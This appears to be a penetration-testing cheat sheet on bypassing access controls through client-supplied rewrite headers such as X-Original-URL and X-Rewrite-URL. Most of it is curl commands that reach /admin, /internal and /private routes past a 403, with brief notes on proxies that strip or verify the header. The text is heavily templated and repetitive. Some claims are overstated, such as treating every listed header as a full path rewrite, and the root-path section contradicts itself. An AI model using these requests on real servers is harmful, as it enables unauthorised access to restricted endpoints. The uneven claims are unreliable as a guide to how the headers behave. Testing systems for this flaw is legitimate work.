# Rewrite headers — the X-Original-URL/X-Rewrite-URL/X-Forwarded-Path sinks, exhaustively

The rewrite headers — the middleware path rewrites + the ACL bypasses.

---

## 1. The model — a middleware path rewrite

```text
the middleware reads a rewrite header for the path — a rewritten path
reaches a gated route — an ACL bypass, a route-confusion, an internal
route reached.
```

## 2. X-Original-URL — the middleware rewrite

```bash
# a client-supplied X-Original-URL — the middleware rewrites the path
curl -i "$BASE/admin"                        # expect 403
curl -i -H 'X-Original-URL: /admin' "$BASE/" # 200 with the admin body = finding
#   the middleware rewrites the path → the admin route reached → an ACL bypass
```

## 3. X-Rewrite-URL — the middleware rewrite

```bash
# a client-supplied X-Rewrite-URL — the middleware rewrites the path
curl -i "$BASE/admin"                        # expect 403
curl -i -H 'X-Rewrite-URL: /admin' "$BASE/" # 200 with the admin body = finding
#   the middleware rewrites the path → the admin route reached → an ACL bypass
```

## 4. X-Forwarded-Path — the middleware rewrite

```bash
# a client-supplied X-Forwarded-Path — the middleware rewrites the path
curl -i "$BASE/admin"                        # expect 403
curl -i -H 'X-Forwarded-Path: /admin' "$BASE/" # 200 with the admin body = finding
#   the middleware rewrites the path → the admin route reached → an ACL bypass
```

## 5. X-Forwarded-Prefix — the middleware rewrite

```bash
# a client-supplied X-Forwarded-Prefix — the middleware rewrites the path
curl -i "$BASE/admin"                        # expect 403
curl -i -H 'X-Forwarded-Prefix: /admin' "$BASE/" # 200 with the admin body = finding
#   the middleware rewrites the path → the admin route reached → an ACL bypass
```

## 6. X-Original-Path — the middleware rewrite

```bash
# a client-supplied X-Original-Path — the middleware rewrites the path
curl -i "$BASE/admin"                        # expect 403
curl -i -H 'X-Original-Path: /admin' "$BASE/" # 200 with the admin body = finding
#   the middleware rewrites the path → the admin route reached → an ACL bypass
```

## 7. X-Real-Path — the middleware rewrite

```bash
# a client-supplied X-Real-Path — the middleware rewrites the path
curl -i "$BASE/admin"                        # expect 403
curl -i -H 'X-Real-Path: /admin' "$BASE/" # 200 with the admin body = finding
#   the middleware rewrites the path → the admin route reached → an ACL bypass
```

## 8. The ACL-bypass shape — the gated route reached

```bash
# the ACL-bypass shape — a gated route reached through the rewrite
curl -i "$BASE/admin"                        # expect 403
curl -i -H 'X-Original-URL: /admin' "$BASE/" # 200 with the admin body = finding
#   the middleware rewrites the path → the admin route reached → an ACL bypass
curl -i "$BASE/internal"                     # expect 403
curl -i -H 'X-Original-URL: /internal' "$BASE/" # 200 with the internal body = finding
#   the middleware rewrites the path → the internal route reached → an ACL bypass
curl -i "$BASE/private"                      # expect 403
curl -i -H 'X-Original-URL: /private' "$BASE/" # 200 with the private body = finding
#   the middleware rewrites the path → the private route reached → an ACL bypass
```

## 9. The rewrite's check — the gated route reached

```bash
# the rewrite's check — does the middleware rewrite the path
curl -i "$BASE/admin"                        # expect 403
curl -i -H 'X-Original-URL: /admin' "$BASE/" # 200 with the admin body = finding
#   a 200 on the gated route → the middleware rewrites the path → an ACL bypass
```

## 10. The rewrite's falsifier — a proxy that strips

```text
a proxy that strips the client-supplied rewrite header → the header
doesn't reach the app → the bypass fails → a different class.
```

## 11. The rewrite's falsifier — a proxy that verifies

```text
a proxy that verifies the rewrite header it added → a client-supplied
header is rejected → the bypass fails → a different class.
```

## 12. The rewrite's falsifier — a non-rewrite check

```text
a trust check that reads a different input (a session, a token, a
signature) → the rewrite header isn't the check's input → a different
class.
```

## 13. The rewrite's reach — the gated route

```text
the rewrite's reach is the gated route — an authenticated-only route,
an internal route, a restricted endpoint — the middleware rewrites the
path → the gated route reached → the ACL bypassed.
```

## 14. The rewrite's edge — a dummy outer path

```bash
# a dummy outer path — the middleware rewrites the inner path
curl -i "$BASE/dummy"                        # expect 403
curl -i -H 'X-Original-URL: /admin' "$BASE/dummy" # 200 with the admin body = finding
#   the middleware rewrites the path → the admin route reached → an ACL bypass
curl -i "$BASE/dummy"                        # expect 403
curl -i -H 'X-Original-URL: /internal' "$BASE/dummy" # 200 with the internal body = finding
#   the middleware rewrites the path → the internal route reached → an ACL bypass
```

## 15. The rewrite's edge — a root outer path

```bash
# a root outer path — the middleware rewrites the inner path
curl -i "$BASE/"                        # expect 403
curl -i -H 'X-Original-URL: /admin' "$BASE/" # 200 with the admin body = finding
#   the middleware rewrites the path → the admin route reached → an ACL bypass
curl -i "$BASE/"                        # expect 403
curl -i -H 'X-Original-URL: /internal' "$BASE/" # 200 with the internal body = finding
#   the middleware rewrites the path → the internal route reached → an ACL bypass
```
